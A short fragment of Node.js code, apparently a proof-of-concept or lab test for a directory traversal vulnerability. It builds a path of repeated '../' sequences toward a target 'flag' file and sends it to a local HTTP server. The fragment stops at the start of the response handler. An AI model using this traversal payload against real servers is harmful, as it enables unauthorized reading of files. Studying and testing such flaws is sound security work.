    console.log(`[Config] Intended Sandbox: ${sandboxDir} | Target File: ${targetFlag}`);

    // 4. Craft malicious path with directory traversal sequences
    const maliciousPath = '/../../../../../../../../../' + targetFlag;

    // 5. Trigger the vulnerability
    http.get(`http://localhost:${port}${maliciousPath}`, (res) => {
        let data = '';
